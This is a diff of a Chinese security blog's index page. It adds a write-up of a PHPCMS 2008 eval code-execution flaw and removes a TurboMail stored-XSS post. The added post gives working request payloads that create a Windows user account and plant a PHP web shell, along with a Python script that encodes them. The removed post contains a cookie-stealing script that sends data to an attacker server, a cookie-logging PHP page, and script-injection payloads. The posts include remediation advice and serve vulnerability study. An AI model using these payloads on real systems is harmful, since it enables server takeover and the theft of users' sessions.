@@ -150,6 +150,120 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-PHPCMS-2008-命令执行漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/02/PHPCMS-2008-命令执行漏洞/">PHPCMS 2008 命令执行漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2018/12/02/PHPCMS-2008-命令执行漏洞/" class="archive-article-date">
+  	<time datetime="2018-12-02T06:23:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p><strong>PHPCMS</strong></p>
+<p>PHPCMS网站管理系统是国内主流的CMS系统之一，目前已有数万网站的应用规模，拥有政府、企业、媒体等各个行业进千名商业用户。</p>
+<p><strong>漏洞介绍</strong></p>
+<p>PHPCMS 2008黄页模块漏洞变量初始化不严导致任意PHP代码执行，在系统函数string2array中调用eval有高风险，在<code>/yp/web/include/common.inc.php</code>中$menu变量初始化不严，导致可以注入执行任意PHP代码。</p>
+<p><strong>影响范围</strong></p>
+<p>PHPCMS 2008 版本</p>
+<p><strong>漏洞危害</strong></p>
+<p>攻击者通过代码执行漏洞，直接可执行系统命令，甚至直接可以直接获取服务器权限，对服务器安全造成极大的威胁</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞代码位于<code>/yp/web/include/common.inc.php</code> 中，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">'IN_PHPCMS'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</span><br><span class="line"></span><br><span class="line">$userid = $userid ? $userid : intval(QUERY_STRING);</span><br><span class="line">$r = $db-&gt;get_one(<span class="string">"SELECT * FROM `"</span>.DB_PRE.<span class="string">"member_company` WHERE `userid`='$userid'"</span>);</span><br><span class="line"><span class="keyword">if</span>($r)</span><br><span class="line">&#123;</span><br><span class="line"> extract($r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$userid)</span><br><span class="line">&#123;</span><br><span class="line"> $MS[<span class="string">'title'</span>] = <span class="string">'你要访问的站点不存在'</span>;</span><br><span class="line"> $MS[<span class="string">'description'</span>] = <span class="string">'请核对网址是否正确.'</span>;</span><br><span class="line"> $MS[<span class="string">'urls'</span>][<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">'name'</span>=&gt;<span class="string">'访问网站首页'</span>,</span><br><span class="line">  <span class="string">'url'</span>=&gt;$PHPCMS[<span class="string">'siteurl'</span>],</span><br><span class="line">  );</span><br><span class="line"> $MS[<span class="string">'urls'</span>][<span class="number">1</span>] = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">'name'</span>=&gt;<span class="string">'注册为本站会员'</span>,</span><br><span class="line">  <span class="string">'url'</span>=&gt;$PHPCMS[<span class="string">'siteurl'</span>].<span class="string">'member/register.php'</span>,</span><br><span class="line">  );</span><br><span class="line"> msg($MS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($tplname)) $tplname = <span class="string">'default'</span>;</span><br><span class="line"><span class="comment">//用户选择的默认模板</span></span><br><span class="line">$companytpl_config = <span class="keyword">include</span> PHPCMS_ROOT.<span class="string">'templates/'</span>.TPL_NAME.<span class="string">'/yp/companytplnames.php'</span>;</span><br><span class="line"></span><br><span class="line">$tpl = $companytpl_config[$tplname][<span class="string">'tplname'</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">define(<span class="string">'TPL'</span>, $tpl);</span><br><span class="line">define(<span class="string">'WEB_SKIN'</span>, <span class="string">'templates/'</span>.TPL_NAME.<span class="string">'/yp/css/'</span>);</span><br><span class="line"><span class="keyword">if</span>($diy)</span><br><span class="line">&#123;</span><br><span class="line"> define(<span class="string">'SKIN_DIY'</span>, WEB_SKIN.$userid.<span class="string">'_diy.css'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> define(<span class="string">'SKIN_DIY'</span>, WEB_SKIN.$companytpl_config[$tplname][<span class="string">'style'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$menu = string2array($menu);</span><br></pre></td></tr></table></figure>
+<p>首先判断有没有定义常量，如果没有定义则提示越权访问，然后从数据库取了一条数据，放到r变量中，如果取成功则使用<code>extract</code>执行r变量。</p>
+<p>extract的意思是：将变量从数组中导入到当前的符号表中。</p>
+<p>我们接着看，如果没有成功，会跳出循环，判断是否存在userid，如果不存在就输出提示信息，如果存在就继续执行，加载模板，加载完之后，我们在最后可以看到这么一行代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$menu = string2array($menu);</span><br></pre></td></tr></table></figure>
+<p>但是我们从开头到这里，并没有看到menu的出现，继续往下看。</p>
+<p>在<code>include/global.func.php</code> 的675行，找到了string2array函数，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">string2array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>($data ==<span class="string">''</span>) <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">"\$array = $data;"</span>);</span><br><span class="line">  <span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先定义了函数string2array，再判断data是否为空，如果是空则返回一个空的数组，如果不是空，则执行eval函数，看到这里就很熟悉了，eval在常用的一句话木马中很常见，它的作用是将字符串当做php代码去执行。</p>
+<p><strong>因此可以尝试传入一个 <code>$_GET[&#39;menu&#39;]</code> ，初始化$menu ，如果再入构造一个不存在的userid，就可以直接将menu的值传入到eval里面去了。</strong></p>
+<p>总的来说，就是因为此处可能查询无结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$r = $db-&gt;get_one(<span class="string">"SELECT * FROM `"</span>.DB_PRE.<span class="string">"member_company` WHERE `userid`='$userid'"</span>);</span><br></pre></td></tr></table></figure>
+<p>而导致下面的逻辑，执行不严谨。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($r)</span><br><span class="line">&#123;</span><br><span class="line">extract($r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们结合phpcms的全局变量初始化机制，可以构造$menu变量，结合string2array函数调用eval的漏洞，成功执行任意代码。</p>
+<p>我们可以构建Payload，添加用户，登录目标机器，如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.12.2/yp/web/index.php?userid=abc&amp;menu=system(net user test test /add);exit();</span><br></pre></td></tr></table></figure>
+<p>然后使用账号密码为：test，test去登录。但是这样是不可行的，<strong>需要对空格和符号进行编码</strong>，才可以成功执行命令，编码后如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.12.2/yp/web/index.php?userid=abc&amp;menu=system(net.CHR(32).user.CHR(32).test.CHR(32).test .CHR(32).CHR(47).add);exit();</span><br></pre></td></tr></table></figure>
+<p><code>.</code> 代表连接符的意思</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接执行payload即可：<code>172.16.12.2/yp/web/index.php?userid=abc&amp;menu=system(net.CHR(32).user.CHR(32).test.CHR(32).test .CHR(32).CHR(47).add);exit();</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># text = "file_put_contents('shell.php','&lt;?php eval($_GET[fun]($_GET[cmd])); ?&gt;');"</span></span><br><span class="line">text = <span class="string">"shell.php,&lt;?php eval($_GET[fun]($_GET[cmd])); ?&gt;"</span></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">    <span class="keyword">if</span> text[i] != <span class="string">','</span>:</span><br><span class="line">        output += <span class="string">"CHR(%s)"</span> % ord(text[i])</span><br><span class="line">        <span class="keyword">if</span> i &lt; len(text) - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> text[i + <span class="number">1</span>] != <span class="string">','</span>:</span><br><span class="line">                output += <span class="string">"."</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">','</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> output</span><br></pre></td></tr></table></figure>
+<p>一句话：<code>&lt;?php eval($_GET[fun]($_GET[cmd])); ?&gt;</code></p>
+<p>不要菜刀连接：<code>file_put_contents(&#39;shell.php&#39;,&#39;&lt;?php eval($_GET[fun]($_GET[cmd])); ?&gt;&#39;);</code></p>
+<p>故访问：<code>http://xx.xx.xx.xx/yp/web/index.php?userid=abc&amp;menu=file_put_contents(CHR(115).CHR(104).CHR(101).CHR(108).CHR(108).CHR(46).CHR(112).CHR(104).CHR(112),CHR(60).CHR(63).CHR(112).CHR(104).CHR(112).CHR(32).CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(36).CHR(95).CHR(71).CHR(69).CHR(84).CHR(91).CHR(102).CHR(117).CHR(110).CHR(93).CHR(40).CHR(36).CHR(95).CHR(71).CHR(69).CHR(84).CHR(91).CHR(99).CHR(109).CHR(100).CHR(93).CHR(41).CHR(41).CHR(59).CHR(32).CHR(63).CHR(62));exit();</code></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>对命令执行漏洞的修复应注意以下几点：</p>
+<ul>
+<li>所有输入都是可疑的，尝试对所有输入提交可能执行命令的构造语句进行严格的检查或者控制外部输入，系统命令执行函数的参数不允许外部传递。</li>
+<li>不仅要验证数据的类型，还要验证其格式、长度、范围和内容。</li>
+<li>不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</li>
+<li>对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。</li>
+</ul>
+<h4 id=""><a href="#" class="headerlink" title=" "></a> </h4>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/12/02/PHPCMS-2008-命令执行漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-KPPW-2-2-任意文件下载漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1097,104 +1211,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/11/26/原则/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-TurboMail存储型XSS漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/25/TurboMail存储型XSS漏洞/">TurboMail存储型XSS漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/25/TurboMail存储型XSS漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-25T07:35:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h2><p><code>app:&quot;TurboMail&quot;</code></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><strong>原因：</strong></p>
-<p><u>邮件内容编辑器对html标签未作转义</u></p>
-<p><u>1.草稿箱中的邮件内容未经转义直接json输出</u></p>
-<p><u>2.邮件内容读取模块未对html转义和过滤javascript函数</u></p>
-<p><strong>TurboMail</strong></p>
-<p>TurboMail邮件系统是面向企事业单位通讯需求而研发的电子邮件服务器系统，研发时间超过十年，作为国产完全自主开发的邮件系统中的佼佼者，客户群体十分广泛。</p>
-<p><strong>漏洞介绍</strong></p>
-<p>TurboMail邮件系统出现XSS存储型漏洞，攻击者可利用发邮件，通过受害者点击来执行JS脚本语句，触发XSS漏洞</p>
-<p><strong>影响范围</strong></p>
-<p>系统版本 &lt;=6.0.0</p>
-<p><strong>漏洞危害</strong></p>
-<p>攻击者通过发送邮件，诱使用户点击恶意邮件，攻击者可获得被害者当前账号Cookie，通过登录邮箱，甚至可能导致整个系统被攻击者恶意篡改，危害十分严重。</p>
-<h3 id="分析Payload"><a href="#分析Payload" class="headerlink" title="分析Payload"></a>分析Payload</h3><p>第一个为payload，当用户点击右键时，我们插入的的邮件内容会自动执行，去调用下面的JS语句。</p>
-<p>代码如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#basexss.js</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> (<span class="keyword">new</span> Image()).src=<span class="string">'http://攻击者服务器ip/xss.php?cookie='</span>+</span><br><span class="line"> <span class="built_in">escape</span>(</span><br><span class="line"> (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> [removed]</span><br><span class="line">      <span class="keyword">catch</span>(e)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"> &#125;</span><br><span class="line"> &#125;)()</span><br><span class="line">)+<span class="string">'&amp;location'</span>+</span><br><span class="line"><span class="built_in">escape</span>(</span><br><span class="line"> (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [removed].href</span><br><span class="line">      &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"> &#125;)()</span><br><span class="line">);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-<p>通过上述JS语句，我们向本地的xss.php发起了一次Get请求，将cookie传递给xss.php。</p>
-<p>第二个文件为xss.php，它可以接收Cookie信息，并输出到当前网页</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#xss.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cookie'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'location'</span>])) &#123;</span><br><span class="line">        $cookie =  $_REQUEST[<span class="string">'cookie'</span>];</span><br><span class="line">        $location =  $_REQUEST[<span class="string">'location'</span>];</span><br><span class="line">		$stri=<span class="string">"&lt;td&gt;"</span>.date(DATE_ATOM).<span class="string">"&lt;/td&gt;&lt;td&gt;Cookie:"</span>.$cookie.<span class="string">"&lt;/td&gt;&lt;td&gt;Location:"</span>.$location.<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">		$fp = file_put_contents(<span class="string">'xss.txt'</span>, $stri.<span class="string">"\n"</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">$fp = file_get_contents(<span class="string">'xss.txt'</span>);</span><br><span class="line">$data = (explode(<span class="string">"\n"</span>,$fp));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;table boder=\"1\"&gt;"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($value == <span class="string">""</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.($key).<span class="string">"&lt;/td&gt;"</span>.$value.<span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/table&gt;"</span>;</span><br></pre></td></tr></table></figure>
-<p>它首先判断是否将Cookie传递过来，如果有传递，则正常接收，并将Cookie初始化为字符串，写入到同目录下的xss.txt里面，最后读取xss.txt，并将里面的字符串输出。</p>
-<p>将xss.php和basexss.js，放入<code>c:/phpstudy/WWW</code> 中。</p>
-<h3 id="payload-txt"><a href="#payload-txt" class="headerlink" title="payload.txt"></a>payload.txt</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">＜script src="http://攻击者服务器IP/basexss.js "＞＜/script＞</span><br><span class="line">或者</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span></span></span><br><span class="line"><span class="tag"><span class="attr">onerror</span>=<span class="string">s</span>=<span class="string">createElement(</span>'<span class="attr">script</span>');<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">'攻击者ip的js地址'</span>;&gt;</span></span><br></pre></td></tr></table></figure>
-<p>当受害者查看邮件点击回复时，就会调用执行我们在本地的脚本basexss.js。</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.请求的url+sessionID</p>
-<p>2.<code>document.cookie=&quot;cookie&quot;</code></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/25/TurboMail存储型XSS漏洞/">展开全文 >></a>
         </p>
       
 
